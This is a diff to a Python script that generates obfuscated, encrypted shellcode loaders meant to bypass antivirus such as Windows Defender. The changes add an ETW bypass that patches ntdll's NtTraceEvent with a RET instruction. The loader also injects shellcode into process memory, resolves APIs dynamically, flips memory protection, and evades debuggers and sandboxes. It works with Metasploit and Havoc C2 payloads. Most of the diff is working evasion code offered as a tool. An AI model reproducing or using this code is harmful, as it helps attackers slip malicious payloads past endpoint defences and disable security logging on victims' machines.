@@ -1,4 +1,3 @@
-#!/usr/bin/python3
 # =================================================================================================================================================================
 # 'Invoke-Python-ShellCodeLoader.py' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
 # It generates an obfuscated and encrypted shellcode loader python script that implements several antivirus bypass and defense evasion techniques.
@@ -8,7 +7,8 @@
 # > Shellcode injection into the memory of the current process (Python)
 # > Shellcode encryption (XOR) and compression (Zlib)
 # > Script obfuscation (function and variable names are randomized + multiple encoding layer)
-# > Dynamic API resolution (via GetProcAddress and LoadLibraryA)
+# > ETW bypass in user-mode (patching 'NtTraceEvent')
+# > Dynamic API resolution for the shellcode injection (via GetProcAddress and LoadLibraryA)
 # > Memory protection change after copy (PAGE_READWRITE changed to PAGE_EXECUTE_READ)
 # > Basic sandbox detection and evasion (Delayed execution + Terminates execution if a debugger is detected)
 # > Compatible with shellcodes of multiple C2 frameworks (e.g., Metasploit, Havoc)
@@ -61,9 +61,11 @@ def generate_loader(shellcode, key, output_path):
     VirtualProtect_addr_var = random_name()
     mem_size_var = random_name()
     shell_func_var = random_name()
+    killetw_func_var = random_name()
 
     formatted_shellcode = format_shellcode(encrypted_shellcode)
     key_repr = ', '.join(f'0x{b:02x}' for b in key)
+
 
     loader_code = f"""import ctypes, zlib, time
 
@@ -72,8 +74,37 @@ isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent()
 if (isDebuggerPresent):
 	sys.exit(1)
 
-# Basic sandbox evasion - Delayed execution
+# Basic delayed execution (basic sandbox evasion)
 time.sleep(6)
+
+# ETW bypass (patching technique)
+def {killetw_func_var}():
+    PAGE_EXECUTE_READWRITE = 0x40
+    kernel32 = ctypes.windll.kernel32
+    ntdll = ctypes.windll.ntdll
+    # Get address of NtTraceEvent
+    try:
+        nttraceevent = ntdll.NtTraceEvent
+        nttraceevent_addr = ctypes.cast(nttraceevent, ctypes.c_void_p).value
+    except AttributeError:
+        return False
+    # Prepare RET opcode
+    ret_opcode = (ctypes.c_char * 1)(0xC3)
+    old_protect = ctypes.c_ulong()
+    # Change memory protection
+    success = kernel32.VirtualProtect(
+        ctypes.c_void_p(nttraceevent_addr),
+        ctypes.c_size_t(1),
+        PAGE_EXECUTE_READWRITE,
+        ctypes.byref(old_protect)
+    )
+    if not success:
+        return False
+    # Patch syscall with RET
+    ctypes.memmove(nttraceevent_addr, ret_opcode, 1)
+    return True
+
+{killetw_func_var}()
 
 def {decrypt_func}(data, key):
     return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])
@@ -159,7 +190,7 @@ exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('<r
 
 banner = """
 
-Invoke-Python-ShellCodeLoader v.1.1
+Invoke-Python-ShellCodeLoader v.2.0
 .------..------..------..------..------..------..------..------..------..------.
 |P.--. ||Y.--. ||S.--. ||C.--. ||L.--. ||O.--. ||A.--. ||D.--. ||E.--. ||R.--. |
 | :/\: || (\/) || :/\: || :/\: || :/\: || :/\: || (\/) || :/\: || (\/) || :(): |
@@ -189,5 +220,7 @@ def main():
     key = b'\xAA\xBB\xCC'  
     generate_loader(shellcode, key, output_path)
 
+
 if __name__ == "__main__":
     main()
+
